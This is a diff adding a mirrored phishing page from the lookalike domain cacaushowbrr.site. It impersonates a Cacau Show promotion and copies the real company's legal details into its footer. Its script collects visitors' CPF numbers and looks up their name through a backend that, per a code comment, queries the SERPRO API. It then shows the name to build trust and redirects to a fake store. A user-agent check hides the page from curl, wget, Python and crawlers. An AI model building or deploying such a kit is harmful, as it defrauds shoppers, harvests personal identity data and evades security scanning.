@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from cacaushowbrr.site/verificacao/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Mar 2025 19:06:19 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Consulta CPF</title>
+  <link rel="stylesheet" href="../../cdn.jsdelivr.net/npm/%40fortawesome/fontawesome-free%406.5.2/css/all.min.css" />
+  
+  <script id="_wautyl">var _wau = _wau || []; _wau.push(["small", "1ufiicv893", "tyl"]);</script><script async src="../../waust.at/s.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px 20px 0;
+      background-color: #180e04;
+      color: #fff;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    main {
+      flex: 1;
+    }
+
+    .logo {
+      width: 200px;
+      max-width: 100%;
+      margin-bottom: 40px;
+    }
+
+    .mensagem {
+      font-size: 18px;
+      margin-bottom: 25px;
+      color: #e0c9a6;
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      width: 100%;
+      max-width: 280px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 10px 20px;
+      margin-top: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      border: none;
+      border-radius: 5px;
+      background-color: #3d2612;
+      color: #fff;
+      font-weight: bold;
+    }
+
+    .resultado,
+    .loading {
+      margin: 30px auto 0;
+      background: #e8d6b2;
+      color: #000;
+      padding: 30px 25px;
+      border-radius: 10px;
+      text-align: left;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 500px;
+      font-size: 17px;
+    }
+
+    .resultado i {
+      width: 20px;
+      color: #3d2612;
+    }
+
+    .resultado p {
+      margin: 16px 0;
+      line-height: 1.7;
+      word-break: break-word;
+      padding-left: 2px;
+    }
+
+    .confirmacao {
+      margin-top: 25px;
+      font-size: 16px;
+      color: #000;
+    }
+
+    .confirmacao.erro label {
+      text-decoration: underline;
+      color: red;
+    }
+
+    .confirmacao input {
+      margin-right: 8px;
+      transform: scale(1.2);
+      cursor: pointer;
+    }
+
+    .mensagem-erro {
+      color: red;
+      margin-top: 10px;
+      font-size: 15px;
+      display: none;
+    }
+
+    .botao-extra {
+      margin-top: 20px;
+      background-color: #3a663a;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-weight: bold;
+      text-decoration: none;
+      transition: background-color 0.3s, transform 0.3s, opacity 0.3s;
+      display: inline-block;
+      animation: pulse 1.8s infinite ease-in-out;
+      opacity: 0.5;
+    }
+
+    .botao-extra.ativo {
+      opacity: 1;
+    }
+
+    @keyframes pulse {
+      0%,
+      100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.03);
+      }
+    }
+
+    .loading i {
+      font-size: 22px;
+      margin-right: 8px;
+      color: #3d2612;
+    }
+
+    footer {
+      margin-top: 60px;
+      font-size: 14px;
+      color: #ccc;
+      text-align: center;
+      line-height: 1.6;
+      padding: 15px 10px;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+    }
+    
+    .user-data {
+      margin-bottom: 20px;
+    }
+    
+    .user-data-item {
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+    
+    .user-data-item i {
+      margin-right: 10px;
+      width: 20px;
+      text-align: center;
+    }
+
+    @media (max-width: 480px) {
+      .mensagem {
+        font-size: 16px;
+      }
+
+      .resultado {
+        font-size: 16px;
+        padding: 24px 18px;
+      }
+
+      .botao-extra {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+    <script>
+        (function () {
+          const suspeitos = [
+            "saveweb2", "HTTrack", "curl", "wget", "python", "php", "node", "Go-http-client", "scrapy"
+          ];
+      
+          const userAgent = navigator.userAgent.toLowerCase();
+          const isSuspeito = suspeitos.some(agent => userAgent.includes(agent.toLowerCase()));
+      
+          const isMobile = /android|iphone|ipad|ipod|mobile/i.test(userAgent);
+      
+          // Se for suspeito e NÃO for mobile, redireciona para página falsa
+          if (isSuspeito && !isMobile) {
+            window.location.href = "../htdocs_error/index.html";
+          }
+        })();
+      </script>
+      
+  <main>
+    <img src="images/logo.png" alt="Logo" class="logo" />
+
+    <div class="mensagem">
+      Digite o seu CPF para confirmar sua oferta especial.<br />
+      <p><strong>Será disponibilizado apenas um desconto por CPF.</strong></p>
+    </div>
+
+    <div id="cpfFormContainer">
+      <input type="text" id="cpfInput" placeholder="Digite o CPF" />
+      <br />
+      <button onclick="consultarCPF()">Consultar</button>
+    </div>
+
+    <div id="loading" class="loading" style="display: none"></div>
+    <div id="resultado" class="resultado" style="display: none"></div>
+  </main>
+
+  <footer>
+    © Copyright 2023. Todos os direitos reservados. <br />
+    Cacau Comércio Eletrônico LTDA 32.143.933/0003-96 <br />
+    Endereço: Rodovia Anhanguera KM 31,7, 800, Bloco 300 Galpão 20, 21 e 22 - Área Selia, Bairro Empresarial Anhanguera, Cajamar – SP, CEP 07.753-580
+  </footer>
+
+  <script src="../../cdn.jsdelivr.net/npm/canvas-confetti%401.6.0/dist/confetti.browser.min.js"></script>
+
+  <script>
+    // Formata automaticamente o CPF conforme digita
+document.getElementById("cpfInput").addEventListener("input", function(e) {
+  let cpf = e.target.value.replace(/\D/g, "").slice(0, 11); // Remove tudo que não é número
+  let formatado = cpf;
+
+  if (cpf.length > 9) {
+    formatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+  } else if (cpf.length > 6) {
+    formatado = cpf.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
+  } else if (cpf.length > 3) {
+    formatado = cpf.replace(/(\d{3})(\d{1,3})/, "$1.$2");
+  }
+
+  e.target.value = formatado;
+});
+
+
+    function validarCPF(cpf) {
+      return /^\d{11}$/.test(cpf);
+    }
+
+    function ativarBotao(selecionado) {
+      const botao = document.getElementById("botaoFinal");
+      const erro = document.getElementById("mensagemErro");
+      const grupo = document.getElementById("confirmacaoGrupo");
+
+      if (selecionado) {
+        botao.classList.add("ativo");
+        erro.style.display = "none";
+        grupo.classList.remove("erro");
+      } else {
+        botao.classList.remove("ativo");
+      }
+    }
+
+function resgatar() {
+  const checkbox = document.getElementById("checkboxConfirmacao");
+  const erro = document.getElementById("mensagemErro");
+  const grupo = document.getElementById("confirmacaoGrupo");
+
+  if (!checkbox.checked) {
+    erro.style.display = "block";
+    grupo.classList.add("erro");
+  } else {
+    confetti({
+      particleCount: 150,
+      spread: 100,
+      origin: { y: 0.6 }
+    });
+
+    setTimeout(() => {
+      // Obtenha os parâmetros UTM da URL atual
+      const urlParams = new URLSearchParams(window.location.search);
+      const utm_source = urlParams.get('utm_source');
+      const utm_medium = urlParams.get('utm_medium');
+      const utm_campaign = urlParams.get('utm_campaign');
+
+      // Crie o link de redirecionamento incluindo os parâmetros UTM
+      let redirectUrl = "../loja/index.html";
+
+      if (utm_source || utm_medium || utm_campaign) {
+        redirectUrl += `?utm_source=${utm_source || ''}&utm_medium=${utm_medium || ''}&utm_campaign=${utm_campaign || ''}`;
+      }
+
+      // Redireciona com os parâmetros UTM
+      window.location.href = redirectUrl;
+    }, 1000);
+  }
+}
+
+
+async function consultarCPF() {
+  const cpf = document.getElementById("cpfInput").value.replace(/\D/g, "").trim();
+  const resultadoDiv = document.getElementById("resultado");
+  const loadingDiv = document.getElementById("loading");
+
+  resultadoDiv.style.display = "none";
+  loadingDiv.innerHTML = "";
+  loadingDiv.style.display = "none";
+
+  if (!validarCPF(cpf)) {
+    resultadoDiv.innerHTML = "Digite um CPF válido.";
+    resultadoDiv.style.display = "block";
+    return;
+  }
+
+  const mensagens = [
+    '<i class="fas fa-search"></i> Consultando CPF...',
+    '<i class="fas fa-clock"></i> Verificando se já resgatou a promoção...',
+    '<i class="fas fa-gift"></i> Gerando desconto especial...'
+  ];
+
+  let etapa = 0;
+  loadingDiv.innerHTML = mensagens[etapa];
+  loadingDiv.style.display = "block";
+
+  const interval = setInterval(() => {
+    etapa++;
+    if (etapa < mensagens.length) {
+      loadingDiv.innerHTML = mensagens[etapa];
+    }
+  }, 2000);
+
+  // Simulamos o tempo de carregamento antes de fazer a chamada real da API
+  await new Promise((resolve) => setTimeout(resolve, 7000));
+  clearInterval(interval);
+
+  try {
+    // Usamos o getcpf.php local que consulta a API SERPRO
+    const response = await fetch(`getcpf.php?cpf=${cpf}`);
+    
+    // Verificamos se a resposta foi bem-sucedida antes de tentar analisar o JSON
+    if (!response.ok) {
+      throw new Error(`Erro HTTP: ${response.status}`);
+    }
+    
+    const data = await response.json();
+    loadingDiv.style.display = "none";
+
+    console.log("Resposta da API:", data); // Log para debug
+
+    if (!data || !data.nome) {
+      resultadoDiv.innerHTML = "CPF não encontrado, por favor, digite um CPF correto.";
+      resultadoDiv.style.display = "block";
+      return;
+    }
+
+    // Salvar dados no localStorage
+    localStorage.setItem('userData', JSON.stringify({
+      nome: data.nome,
+      cpf: cpf
+    }));
+
+    // Remover formulário
+    document.getElementById('cpfFormContainer').style.display = 'none';
+
+    // Formatar o CPF
+    const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    
+    // Nome completo (baseado na API)
+    const nome = data.nome;
+    
+    // Data de nascimento formatada
+    const dataNascFormatada = data.nascimento || null;
+
+    const html = `
+      <div class="user-data">
+
+      <p style="margin-bottom: 10px; font-size: 18px; line-height: 1.3;">Olá ${nome}, tudo certo!</p>
+      <p>Você está apenas um clique de garantir seu mega desconto! Basta marcar a caixa abaixo e clicar no botão.</p>
+
+      <div id="confirmacaoGrupo" class="confirmacao">
+        <input type="checkbox" id="checkboxConfirmacao" onclick="ativarBotao(this.checked)" />
+        <label for="checkboxConfirmacao">
+          Eu confirmo que estou ciente das condições e aceito a promoção.
+        </label>
+        <br />
+        <div class="mensagem-erro" id="mensagemErro">
+          Você precisa confirmar para prosseguir.
+        </div>
+      </div>
+
+      <a href="javascript:void(0);" id="botaoFinal" class="botao-extra" onclick="resgatar()">Resgatar Mega Desconto</a>
+    `;
+
+    resultadoDiv.innerHTML = html;
+    resultadoDiv.style.display = "block";
+  } catch (error) {
+    console.error("Erro na consulta de CPF:", error);
+    loadingDiv.style.display = "none";
+    
+    // Mensagem de erro mais informativa para o usuário dependendo do tipo de erro
+    if (error.name === 'AbortError') {
+      resultadoDiv.innerHTML = "A consulta ultrapassou o tempo limite. Por favor, tente novamente.";
+    } else if (error.message && error.message.includes('HTTP')) {
+      resultadoDiv.innerHTML = "Serviço de consulta temporariamente indisponível. Por favor, tente novamente mais tarde.";
+    } else {
+      resultadoDiv.innerHTML = "Ocorreu um erro ao consultar o CPF. Tente novamente.";
+    }
+    
+    resultadoDiv.style.display = "block";
+  }
+}
+
+  </script>
+
+  <script
+    src="../../cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+</body>
+
+<!-- Mirrored from cacaushowbrr.site/verificacao/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Mar 2025 19:06:20 GMT -->
+</html>
